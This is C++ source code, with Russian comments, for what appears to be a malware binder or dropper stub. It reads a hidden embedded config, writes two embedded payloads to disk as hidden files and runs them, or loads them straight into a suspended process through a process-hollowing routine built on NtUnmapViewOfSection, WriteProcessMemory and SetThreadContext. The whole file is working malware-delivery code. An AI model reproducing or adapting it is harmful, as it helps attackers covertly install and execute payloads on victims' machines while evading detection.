// Generated.cpp: определяет точку входа для приложения.
//

#include "stdafx.h"
#include "Generated.h"
#include <windows.h>
#include <exception>
#include <shellapi.h>
#include <string>
#include <vector>

typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

struct settings
{
public:
	CHAR name[255];
	BOOL temp;
	BOOL delete_file;
	BOOL copy_on_disk;
	BOOL virt;
};

settings file1, file2;


//BOOL extract(DWORD numb, LPCSTR name, BOOL del)
BOOL extract(DWORD numb, LPCSTR name)
{
	try {
		HANDLE hFile;		
		STARTUPINFO SI;
		PROCESS_INFORMATION PI;
		CHAR exeBuf[MAX_PATH];
		DWORD dw;
		std::string path;
		SHELLEXECUTEINFO ShExecInfo = { 0 };
		BOOL shell = FALSE;


		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(numb), RT_RCDATA);		// Получаем дескриптор ресурса
		HGLOBAL mem_block = LoadResource(NULL, hRes);							// грузим его в глобальную память
		void* pointer = LockResource(mem_block);								// получаем указатель на него
		DWORD size = SizeofResource(0, hRes);									// и его размер

		//пишем в файл
		
		hFile = CreateFile(name, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
		DWORD written;
		BOOL is_extracted = WriteFile(hFile, pointer, size, &written, NULL);
 		CloseHandle(hFile);
		FreeResource(mem_block);
		
		dw = (DWORD)FindExecutable(name, NULL, exeBuf);
		if (dw > 32) {
			ZeroMemory(&SI, sizeof(STARTUPINFO));
			SI.cb = sizeof(SI);
			
			if (std::string(exeBuf) == name)
				path = name;
			else
				path = std::string(exeBuf) + " " + name;

			LPSTR s = const_cast<CHAR *>(path.c_str());
			CreateProcess(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI);
		}
		else
		{
			ZeroMemory(&SI, sizeof(STARTUPINFO));
			SI.cb = sizeof(SI);
			LPSTR s = const_cast<CHAR *>(name);
			if (!CreateProcess(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI))
				if (!CreateProcess(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI))
				{
					ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
					ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
					ShExecInfo.hwnd = NULL;
					ShExecInfo.lpVerb = NULL;
					ShExecInfo.lpFile = name;
					ShExecInfo.lpParameters = "";
					ShExecInfo.lpDirectory = NULL;
					ShExecInfo.nShow = SW_SHOW;
					ShExecInfo.hInstApp = NULL;
					ShellExecuteEx(&ShExecInfo);
					shell = true;
				}
		}

		//if (del) {
		//	if (shell)
		//		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
		//	else
		//		WaitForInputIdle(PI.hProcess, INFINITE);
		//	Sleep(10000);
		//	DeleteFile(name);
		//}
		return is_extracted;
	}
	catch (...)
	{
	}
	return false;
}

void get_setings()
{
	try {
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(2000), RT_RCDATA);		// Получаем дескриптор ресурса
		HGLOBAL mem_block = LoadResource(NULL, hRes);							// грузим его в глобальную память
		void* pointer = LockResource(mem_block);								// получаем указатель на него
		DWORD size = SizeofResource(0, hRes);									// и его размер

		//пишем в файл
		HANDLE hFile = CreateFile("config.ini", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
		DWORD written;
		WriteFile(hFile, pointer, size, &written, NULL);
		CloseHandle(hFile);

		CHAR buffer[MAX_PATH];
		GetCurrentDirectory(sizeof(buffer), buffer);
		std::string path = std::string(buffer) + "\\config.ini";

		GetPrivateProfileString("first_file", "name", NULL, file1.name, sizeof(file1.name), path.c_str());
		file1.temp = GetPrivateProfileInt("first_file", "temp", 0, path.c_str());
		file1.delete_file = GetPrivateProfileInt("first_file", "delete_file", 0, path.c_str());
		file1.virt = GetPrivateProfileInt("first_file", "virtual", 0, path.c_str());

		GetPrivateProfileString("second_file", "name", NULL, file2.name, sizeof(file2.name), path.c_str());
		file2.temp = GetPrivateProfileInt("second_file", "temp", 0, path.c_str());
		file2.delete_file = GetPrivateProfileInt("second_file", "delete_file", 0, path.c_str());
		file2.virt = GetPrivateProfileInt("second_file", "virtual", 0, path.c_str());

		DeleteFile("config.ini");


		FreeResource(mem_block);

	}
	catch (...)
	{

	}
}

void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
{
	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	LPVOID pImageBase;
	int Count;

	IDH = PIMAGE_DOS_HEADER(pFile);
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dl"), "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}

					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
					if (pImageBase)
					{
						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
						ResumeThread(PI.hThread);
					}
				}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	TCHAR szFilePath[1024];
	CHAR buffer[100];
	DWORD dwBufSize = BUFSIZ;
	CHAR TempPath[BUFSIZ];

	get_setings();
	GetTempPath(dwBufSize, TempPath);

	/*	Первый файл	*/
	if (file1.virt)
	{
		GetModuleFileNameA(0, szFilePath, 1024);
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1001), RT_RCDATA);
		HGLOBAL mem_block = LoadResource(NULL, hRes);
		RunFromMemory(szFilePath, mem_block);
	}
	else
	{
		if (file1.temp)
		{
			std::string name1 = std::string(TempPath) + file1.name;
			//extract(1001, name1.c_str(), file1.delete_file);
			extract(1001, name1.c_str());
		}
		else
			//extract(1001, file1.name, file1.delete_file);
			extract(1001, file1.name);
	}


	/*	Второй файл	*/
	if (file2.virt)
	{
		GetModuleFileNameA(0, szFilePath, 1024);
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1002), RT_RCDATA);
		HGLOBAL mem_block = LoadResource(NULL, hRes);
		RunFromMemory(szFilePath, mem_block);
	}
	else
	{
		if (file2.temp)
		{
			std::string name2 = std::string(TempPath) + file2.name;
			//extract(1002, name2.c_str(), file2.delete_file);
			extract(1002, name2.c_str());
		}
		else
			//extract(1002, file2.name, file2.delete_file);
			extract(1002, file2.name);
	}

	return 0;
}